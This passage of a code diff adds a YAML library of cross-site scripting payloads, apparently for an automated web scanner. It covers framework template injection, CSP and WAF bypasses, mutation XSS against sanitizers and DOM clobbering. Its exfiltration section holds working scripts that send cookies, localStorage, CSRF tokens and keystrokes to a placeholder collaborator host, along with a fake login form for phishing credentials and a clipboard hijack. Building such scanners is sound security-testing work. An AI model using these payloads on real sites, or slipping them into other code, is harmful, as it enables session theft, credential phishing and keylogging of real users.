+    notes: "Vue 2 template injection. Access render function constructor via _c."
+    tags: [framework, vue, template_injection]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<component :is=\"'script'\" src=\"http://COLLAB_DOMAIN/xss.js\"></component>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Vue dynamic component injection. If :is binding is user-controlled, can render script element."
+    tags: [framework, vue, dynamic_component]
+
+  # jQuery
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert('jq')>"
+    notes: "jQuery .html() / .append() / .prepend() with user input. jQuery parses HTML strings and inserts into DOM."
+    tags: [framework, jquery, html_method]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "#<img src=x onerror=alert('jq')>"
+    notes: "jQuery selector injection. If location.hash passed to $(), jQuery creates DOM elements from HTML strings."
+    tags: [framework, jquery, selector_injection]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<div onmouseover=alert(document.domain)>hover</div>"
+    notes: "jQuery $(user_input) with event handler. Old jQuery versions auto-execute inline handlers."
+    tags: [framework, jquery, event_handler]
+
+  # Server-side template engines
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{7*7}}"
+    notes: "Template injection probe. If output is 49, confirms server-side template evaluation. Gateway to XSS."
+    tags: [framework, ssti, probe, jinja2, twig]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<%= system('id') %>"
+    notes: "ERB template injection (Ruby). If evaluated, confirms code execution context that can render XSS."
+    tags: [framework, ssti, erb, ruby]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "#{7*7}"
+    notes: "Pug/Jade template injection probe. If output is 49, user input reaches template engine."
+    tags: [framework, ssti, pug, jade]
+
+  # Handlebars / Mustache
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "{{{<img src=x onerror=alert(1)>}}}"
+    notes: "Handlebars triple-stash unescaped output. If user input reaches triple-brace context, raw HTML rendered."
+    tags: [framework, handlebars, unescaped]
+
+  # Next.js / Nuxt SSR
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "</script><script>alert(document.domain)</script>"
+    notes: "SSR hydration XSS. If user input serialized in __NEXT_DATA__ or __NUXT__ script tag without escaping."
+    tags: [framework, nextjs, nuxt, ssr, hydration]
+
+  # Svelte
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert('svelte')>"
+    notes: "Svelte {@html} tag renders raw HTML. If user input passed to {@html expr}, XSS occurs."
+    tags: [framework, svelte, html_tag]
+
+  # htmx
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<div hx-get=\"http://COLLAB_DOMAIN/xss\" hx-trigger=\"load\"></div>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "htmx attribute injection. If user input reflected in HTML, htmx attributes trigger requests and swap content."
+    tags: [framework, htmx, hx_get, attribute_injection]
+
+  # =============================================================================
+  # CSP BYPASS
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<base href=\"http://COLLAB_DOMAIN/\">"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Base tag injection to redirect relative URLs. May bypass CSP."
+    tags: [bypass, csp, base_tag]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script src=\"http://COLLAB_DOMAIN/xss.js\"></script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "External script load. Tests CSP script-src restrictions."
+    tags: [html, external_script, csp_test]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<link rel=import href=\"http://COLLAB_DOMAIN/xss.html\">"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "HTML import for CSP bypass (legacy, works in older Chrome)."
+    tags: [bypass, csp, html_import]
+
+  # CSP — JSONP callback
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script src=\"/api/jsonp?callback=alert(document.domain)//\"></script>"
+    notes: "JSONP callback parameter XSS. If same-origin JSONP endpoint exists and CSP allows self, callback controls output."
+    tags: [bypass, csp, jsonp, callback]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script src=\"https://accounts.google.com/o/oauth2/revoke?callback=alert(1)\"></script>"
+    notes: "CSP bypass via trusted JSONP endpoint. If CSP whitelists *.google.com, this endpoint reflects callback."
+    tags: [bypass, csp, jsonp, google]
+
+  # CSP — Angular CDN bypass
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script src=\"https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.8.3/angular.min.js\"></script><div ng-app>{{constructor.constructor('alert(document.domain)')()}}</div>"
+    notes: "CSP bypass via AngularJS CDN. If CSP allows cdnjs.cloudflare.com, load Angular and exploit template injection."
+    tags: [bypass, csp, angular, cdn]
+
+  # CSP — Nonce leak via CSS
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<style>*[nonce] { background: url('http://COLLAB_DOMAIN/?nonce=') }</style>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "CSS attribute selector to exfiltrate script nonce values. If CSP uses nonces and injection exists before script tags."
+    tags: [bypass, csp, nonce_leak, css]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<style>script[nonce^=\"a\"] { background: url('http://COLLAB_DOMAIN/?nonce=a') }</style>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "CSS nonce exfiltration via prefix matching. Iterate characters to reconstruct full nonce."
+    tags: [bypass, csp, nonce_leak, css_prefix]
+
+  # CSP — Script gadgets
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<div data-main=\"data:,alert(document.domain)\"></div><script src=\"require.js\"></script>"
+    notes: "RequireJS script gadget. data-main attribute loads arbitrary script if require.js is present."
+    tags: [bypass, csp, script_gadget, requirejs]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script src=\"/angular.js\"></script><div ng-app ng-csp>{{$eval.constructor('alert(1)')()}}</div>"
+    notes: "Angular script gadget CSP bypass. Uses already-hosted Angular to eval template expressions."
+    tags: [bypass, csp, script_gadget, angular]
+
+  # CSP — meta tag override
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<meta http-equiv=\"Content-Security-Policy\" content=\"script-src 'unsafe-inline'\">"
+    notes: "meta CSP override attempt. If injected before server CSP header is processed, may relax policy. Only works if no header CSP."
+    tags: [bypass, csp, meta, override]
+
+  # CSP — object-src bypass
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<object data=\"http://COLLAB_DOMAIN/xss.swf\"></object>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "CSP bypass via object-src if not restricted. Loads external Flash/plugin content that can execute JS."
+    tags: [bypass, csp, object_src, plugin]
+
+  # CSP — worker-src bypass
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>new Worker('data:,postMessage(document.domain)');</script>"
+    notes: "CSP bypass via data: URI in Worker. If worker-src allows data:, code runs in Worker context."
+    tags: [bypass, csp, worker, data_uri]
+
+  # CSP — path traversal in script-src
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script src=\"/uploads/../api/jsonp?callback=alert(1)\"></script>"
+    notes: "CSP path bypass via path traversal. If CSP restricts to /static/ path, traverse to JSONP endpoint."
+    tags: [bypass, csp, path_traversal, jsonp]
+
+  # =============================================================================
+  # ADVANCED BYPASS / WAF EVASION
+  # =============================================================================
+
+  # Null byte variants
+  - technique: reflected
+    injection_surface: query
+    encoding: null_byte
+    evidence_type: content_match
+    risk: 2
+    payload: "%00<script>alert(1)</script>"
+    notes: "Null byte prefix. Some WAFs/parsers truncate at null byte, passing the rest to the app."
+    tags: [bypass, waf, null_byte]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: null_byte
+    evidence_type: content_match
+    risk: 2
+    payload: "<scri%00pt>alert(1)</scri%00pt>"
+    notes: "Null byte within tag name. Some parsers ignore null bytes; WAF sees broken tag, browser sees script."
+    tags: [bypass, waf, null_byte, inline]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: null_byte
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=\"al%00ert(1)\">"
+    notes: "Null byte inside JavaScript function name. WAF may not match 'alert' pattern."
+    tags: [bypass, waf, null_byte, function]
+
+  # JavaScript protocol obfuscation
+  - technique: reflected
+    injection_surface: query
+    encoding: html_entity
+    evidence_type: content_match
+    risk: 2
+    payload: "&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;:alert(1)"
+    notes: "HTML entity encoded javascript: protocol. Browsers decode entities in href/src attribute values."
+    tags: [bypass, waf, html_entity, javascript_uri]
+
+  - technique: reflected
+    injection_surface: query
+    encoding: unicode
+    evidence_type: content_match
+    risk: 2
+    payload: "\\u006a\\u0061\\u0076\\u0061\\u0073\\u0063\\u0072\\u0069\\u0070\\u0074:alert(1)"
+    notes: "Unicode escaped javascript: protocol. Some contexts decode unicode escapes."
+    tags: [bypass, waf, unicode, javascript_uri]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "java\tscript:alert(1)"
+    notes: "Tab character within javascript: protocol. Browsers ignore whitespace in protocol names."
+    tags: [bypass, waf, whitespace, javascript_uri]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "java\nscript:alert(1)"
+    notes: "Newline within javascript: protocol. Browsers ignore newlines/carriage returns."
+    tags: [bypass, waf, newline, javascript_uri]
+
+  # SVG use / foreignObject
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/></svg>"
+    notes: "SVG use element with data: URI to load external SVG containing XSS."
+    tags: [bypass, svg, use, data_uri]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg><foreignObject><body xmlns=\"http://www.w3.org/1999/xhtml\" onload=\"alert(document.domain)\"/></foreignObject></svg>"
+    notes: "SVG foreignObject to embed XHTML body with onload. Switches parser to HTML namespace."
+    tags: [bypass, svg, foreignobject, xhtml]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<svg><foreignObject><iframe xmlns=\"http://www.w3.org/1999/xhtml\" src=\"javascript:alert(document.domain)\"></iframe></foreignObject></svg>"
+    notes: "SVG foreignObject with XHTML iframe using javascript: src."
+    tags: [bypass, svg, foreignobject, iframe]
+
+  # HTML5 features
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<form action=\"javascript:alert(document.domain)\"><button>submit</button></form>"
+    notes: "Form action with javascript: URI. Executes on form submission."
+    tags: [bypass, html5, form_action]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<input type=\"submit\" formaction=\"javascript:alert(document.domain)\" value=\"click\">"
+    notes: "HTML5 formaction attribute overrides parent form action."
+    tags: [bypass, html5, formaction]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<button formaction=\"javascript:alert(document.domain)\">click</button>"
+    notes: "Button formaction attribute with javascript: URI."
+    tags: [bypass, html5, button, formaction]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<input onfocus=alert(document.domain) autofocus tabindex=1>"
+    notes: "Input autofocus with tabindex ensuring focus order. Fires onfocus immediately."
+    tags: [bypass, html5, autofocus, tabindex]
+
+  # CSS injection
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<div style=\"background:url(javascript:alert(1))\">"
+    notes: "CSS background javascript: URI. Works in IE/legacy browsers."
+    tags: [bypass, css, javascript_uri, legacy]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<div style=\"width:expression(alert(document.domain))\">"
+    notes: "CSS expression() for IE. Evaluates JS in CSS context."
+    tags: [bypass, css, expression, ie]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<style>@import url('http://COLLAB_DOMAIN/xss.css');</style>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "CSS @import to load external stylesheet. Can exfiltrate data via attribute selectors."
+    tags: [bypass, css, import, exfiltration]
+
+  # Import maps exploitation
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script type=\"importmap\">{\"imports\":{\"lodash\":\"http://COLLAB_DOMAIN/xss.js\"}}</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Import map injection to hijack module imports. If app uses import 'lodash', loads attacker script."
+    tags: [bypass, import_map, module_hijack]
+
+  # WAF evasion — encoding tricks
+  - technique: reflected
+    injection_surface: query
+    encoding: base64
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>eval(atob('YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=='))</script>"
+    notes: "Base64 encoded payload via atob(). WAFs cannot pattern-match the encoded alert call."
+    tags: [bypass, waf, base64, atob]
+
+  # WAF evasion — constructor chain
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=[].constructor.constructor('alert(document.domain)')()>"
+    notes: "Function constructor chain avoiding direct alert/eval keywords. Bypasses keyword-based WAF rules."
+    tags: [bypass, waf, constructor_chain, no_keywords]
+
+  # WAF evasion — fetch + String.fromCharCode
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=this[String.fromCharCode(111,110,101,114,114,111,114)]=null;alert(1)>"
+    notes: "Dynamic property access via fromCharCode. Obfuscates event handler name from WAF inspection."
+    tags: [bypass, waf, fromcharcode, dynamic_property]
+
+  # WAF evasion — comment splitting
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>al/**/ert(1)</script>"
+    notes: "JavaScript comment between function name characters. WAF may not match 'alert' with comment insertion."
+    tags: [bypass, waf, comment_split]
+
+  # WAF evasion — UTF-7 encoding
+  - technique: reflected
+    injection_surface: query
+    encoding: unicode
+    evidence_type: content_match
+    risk: 2
+    payload: "+ADw-script+AD4-alert(1)+ADw-/script+AD4-"
+    notes: "UTF-7 encoded XSS. If response charset is UTF-7 or unspecified, browser may decode this."
+    tags: [bypass, waf, utf7, encoding]
+
+  # WAF evasion — double encoding in event handlers
+  - technique: reflected
+    injection_surface: query
+    encoding: double_url
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=%2561lert(1)>"
+    notes: "Double URL-encoded 'a' in alert. Server decodes once to %61, browser decodes to 'a'."
+    tags: [bypass, waf, double_encode, event_handler]
+
+  # Trusted Types bypass patterns
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<script>trustedTypes.createPolicy('default',{createHTML:s=>s})</script><img src=x onerror=alert(1)>"
+    notes: "Trusted Types bypass by creating permissive default policy. If injection before Trusted Types enforcement."
+    tags: [bypass, trusted_types, default_policy]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert('tt')>"
+    notes: "Trusted Types probe. If Trusted Types not enforced (report-only), standard payloads still work."
+    tags: [bypass, trusted_types, probe]
+
+  # =============================================================================
+  # MUTATION XSS (mXSS)
+  # =============================================================================
+
+  # DOMPurify bypass patterns
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<math><mtext><table><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">"
+    notes: "MathML-based mutation XSS. Exploits parser differences between DOMPurify and browser."
+    tags: [mxss, mathml, dompurify, parser_differential]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<svg></p><style><a id=\"</style><img src=x onerror=alert(1)>\">"
+    notes: "mXSS via SVG + style element. Parser re-parses style content, creating active HTML from inert context."
+    tags: [mxss, svg, style, parser_differential]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<noscript><p title=\"</noscript><img src=x onerror=alert(document.domain)>\">"
+    notes: "mXSS via noscript element. Parser treats noscript differently depending on scripting flag."
+    tags: [mxss, noscript, parser_differential]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id=\"</textarea><img onerror=alert(1) src>\">"
+    notes: "Form + MathML mXSS. Double form tag confuses tree builder, enabling script execution."
+    tags: [mxss, form, mathml, tree_builder]
+
+  # Namespace confusion
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<svg><svg><foreignObject><desc><svg onload=alert(document.domain)>"
+    notes: "Nested SVG namespace confusion. Multiple SVG contexts confuse sanitizer namespace tracking."
+    tags: [mxss, namespace_confusion, svg, nested]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<svg><desc><svg><foreignObject><textarea></textarea><img src=x onerror=alert(1)></foreignObject></svg></desc></svg>"
+    notes: "SVG desc + foreignObject namespace confusion. Sanitizer may miss active content in desc element."
+    tags: [mxss, namespace_confusion, desc, foreignobject]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<math><annotation-xml encoding=\"text/html\"><svg><foreignObject><img src=x onerror=alert(1)></foreignObject></svg></annotation-xml></math>"
+    notes: "MathML annotation-xml integration point. HTML content allowed inside MathML annotation-xml with text/html encoding."
+    tags: [mxss, namespace_confusion, mathml, annotation]
+
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<xmp><p title=\"</xmp><svg onload=alert(document.domain)>\">"
+    notes: "mXSS via deprecated xmp element. Sanitizer parses as raw text, browser re-parses as HTML."
+    tags: [mxss, xmp, deprecated, parser_differential]
+
+  # =============================================================================
+  # EXFILTRATION PAYLOADS
+  # =============================================================================
+
+  # Cookie theft
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>fetch('http://COLLAB_DOMAIN/?c='+document.cookie)</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Cookie exfiltration via fetch to collaborator. Confirms XSS with proof of data theft."
+    tags: [exfiltration, cookie, fetch]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>new Image().src='http://COLLAB_DOMAIN/?c='+document.cookie</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Cookie exfiltration via Image object. Works even with strict CSP on fetch/XHR if img-src is open."
+    tags: [exfiltration, cookie, image]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>navigator.sendBeacon('http://COLLAB_DOMAIN/',document.cookie)</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Cookie exfiltration via sendBeacon. Persists even during page navigation/close."
+    tags: [exfiltration, cookie, sendbeacon]
+
+  # DOM content exfiltration
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>fetch('http://COLLAB_DOMAIN/',{method:'POST',body:document.body.innerHTML})</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Full page DOM content exfiltration. Captures rendered page including sensitive data."
+    tags: [exfiltration, dom_content, fetch]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>fetch('http://COLLAB_DOMAIN/?t='+btoa(document.querySelector('[name=csrf]')?.value))</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "CSRF token exfiltration. Extracts hidden CSRF token from the DOM."
+    tags: [exfiltration, csrf_token, fetch]
+
+  # Keylogger injection
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>document.addEventListener('keypress',e=>fetch('http://COLLAB_DOMAIN/?k='+e.key))</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Keylogger via keypress event listener. Sends each keystroke to collaborator."
+    tags: [exfiltration, keylogger, keypress]
+
+  # Form hijacking
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>document.forms[0].action='http://COLLAB_DOMAIN/'</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Form action hijack. Redirects form submission to attacker-controlled server."
+    tags: [exfiltration, form_hijack, action]
+
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<form action=\"http://COLLAB_DOMAIN/\"><input name=password type=password placeholder=\"Session expired. Re-enter password:\"><input type=submit value=\"Login\"></form>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Fake login form for credential phishing. Injected form captures credentials and sends to attacker."
+    tags: [exfiltration, credential_theft, fake_login]
+
+  # LocalStorage exfiltration
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 3
+    payload: "<script>fetch('http://COLLAB_DOMAIN/',{method:'POST',body:JSON.stringify(localStorage)})</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Exfiltrate entire localStorage contents. May contain JWT tokens, API keys, or session data."
+    tags: [exfiltration, localstorage, jwt]
+
+  # Clipboard hijacking
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 3
+    payload: "<script>document.addEventListener('copy',e=>{e.clipboardData.setData('text/plain','http://COLLAB_DOMAIN/malicious');e.preventDefault()})</script>"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Clipboard hijack. Overrides copy action to replace clipboard content with attacker URL."
+    tags: [exfiltration, clipboard, hijack]
+
+  # =============================================================================
+  # XML BODY / JSON BODY CONTEXT
+  # =============================================================================
+
+  - technique: reflected
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 2
+    payload: "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(document.domain)</x:script>"
+    notes: "XSS via XML namespace. If XML response rendered as HTML, XHTML script element executes."
+    tags: [xml, xhtml_namespace, script]
+
+  - technique: reflected
+    injection_surface: xml_body
+    evidence_type: content_match
+    risk: 2
+    payload: "<![CDATA[<script>alert(document.domain)</script>]]>"
+    notes: "CDATA section XSS in XML body. If XML parsed and rendered, CDATA content may be treated as HTML."
+    tags: [xml, cdata, script]
+
+  - technique: reflected
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "</script><script>alert(document.domain)</script>"
+    notes: "JSON response XSS when JSON embedded in script tag. Breaks out of JSON string and script context."
+    tags: [json, script_breakout]
+
+  # =============================================================================
+  # MISCELLANEOUS / EDGE CASES
+  # =============================================================================
+
+  # Dangling markup injection
+  - technique: reflected
+    injection_surface: query
+    evidence_type: dns_hit
+    risk: 2
+    payload: "<img src=\"http://COLLAB_DOMAIN/?"
+    placeholders: [COLLAB_DOMAIN]
+    notes: "Dangling markup injection. Unclosed attribute captures subsequent page content as part of URL request."
+    tags: [dangling_markup, data_leak, img]
+
+  # Meta refresh redirect
+  - technique: reflected
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(document.domain)\">"
+    notes: "Meta refresh with javascript: URL. Some browsers execute JS from meta refresh."
+    tags: [html, meta_refresh, redirect]
+
+  # Embed / applet
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<embed src=\"javascript:alert(document.domain)\">"
+    notes: "Embed tag with javascript: src."
+    tags: [html, embed, javascript_uri]
+
+  # Event handler via onanimationend
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<style>@keyframes x{}</style><div style=\"animation:x\" onanimationend=alert(document.domain)>test</div>"
+    notes: "CSS animation + onanimationend event handler. Less commonly filtered than onload/onerror."
+    tags: [bypass, css_animation, onanimationend]
+
+  # Srcset injection
+  - technique: reflected
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "\"><img srcset=\"x\" onerror=\"alert(document.domain)\">"
+    notes: "Attribute breakout into img with srcset. Tests if srcset attribute is filtered differently than src."
+    tags: [bypass, srcset, attribute_breakout]
+
+  # onclick without tags — attribute injection only
+  - technique: reflected
+    injection_surface: query
+    string_boundary: unquoted
+    evidence_type: content_match
+    risk: 2
+    payload: "x onclick=alert(1)"
+    notes: "Unquoted attribute injection. If reflected inside an unquoted attribute, inject event handler directly."
+    tags: [attribute, unquoted, onclick]
+
+  # Numeric context breakout
+  - technique: reflected
+    injection_surface: query
+    string_boundary: numeric
+    evidence_type: content_match
+    risk: 2
+    payload: "1;alert(1)"
+    notes: "Numeric context breakout in script. If input inserted as number in JS expression."
+    tags: [script_context, numeric, breakout]
+
+  # Newline-based tag injection (CRLF)
+  - technique: reflected
+    injection_surface: header
+    evidence_type: content_match
+    risk: 2
+    payload: "%0d%0a%0d%0a<script>alert(document.domain)</script>"
+    notes: "CRLF injection in HTTP header to inject HTML body. If header value reflected without newline sanitization."
+    tags: [crlf, header_injection, script]
+
+  # XSS via SVG in CSS background
+  - technique: stored
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 3
+    payload: "<div style=\"background-image:url('data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 onload=%22alert(1)%22/>')\">"
+    notes: "SVG XSS via inline CSS background-image data URI. Sanitizers may miss SVG in CSS context."
+    tags: [stored, svg, css_background, data_uri]
+
+  # Polyglot for JSON + HTML context
+  - technique: polyglot
+    injection_surface: json_body
+    evidence_type: content_match
+    risk: 2
+    payload: "\"--></script><img src=x onerror=alert(document.domain)>//\""
+    notes: "Polyglot for JSON value that may be rendered in script tag or HTML context."
+    tags: [polyglot, json, html, script]
+
+  # Open redirect to javascript:
+  - technique: dom
+    injection_surface: query
+    evidence_type: redirect
+    risk: 2
+    payload: "//javascript:alert(document.domain)"
+    notes: "Protocol-relative URL confusion. Some URL parsers treat //javascript: as valid, leading to XSS via redirect."
+    tags: [dom, redirect, protocol_relative, javascript_uri]
+
+  # XSS via error page reflection
+  - technique: reflected
+    injection_surface: path
+    evidence_type: content_match
+    risk: 2
+    payload: "/<img src=x onerror=alert(document.domain)>"
+    notes: "XSS via 404 error page path reflection. Many apps reflect the requested path in error pages."
+    tags: [html, error_page, path, img]
+
+  # WebSocket message injection
+  - technique: dom
+    injection_surface: query
+    evidence_type: content_match
+    risk: 2
+    payload: "<img src=x onerror=alert('ws')>"
+    notes: "DOM XSS via WebSocket message handler. If ws.onmessage inserts event.data into innerHTML."
+    tags: [dom, websocket, onmessage, innerhtml]
+
+  # ============================================================
+  # DOM CLOBBERING
+  # ============================================================
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<form id=x><input name=y value=clobbered></form>"
+    notes: "DOM clobbering — creates form element accessible via document.x.y.value. May override JS variables."
+    tags: [dom, clobbering, form, input]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<a id=x href=javascript:alert(1)>"
+    notes: "DOM clobbering — anchor element clobbers document.x. toString() returns href value."
+    tags: [dom, clobbering, anchor, href]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<img id=x name=y src=1>"
+    notes: "DOM clobbering — img element clobbers document.x and document.y. May bypass JS security checks."
+    tags: [dom, clobbering, img, named]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<form id=document><input name=cookie value=clobbered></form>"
+    notes: "DOM clobbering — clobbers document.cookie reference. Breaks JS that reads document.cookie."
+    tags: [dom, clobbering, document_cookie]
+
+  - technique: dom_clobbering
+    injection_surface: query
+    evidence_type: dom_execution
+    risk: 2
+    payload: "<a id=x><a id=x name=y href=cid:clobbered>"
+    notes: "DOM clobbering — HTMLCollection via duplicate IDs. document.x returns collection, x.y resolves via named item."
+    tags: [dom, clobbering, collection, duplicate_id]
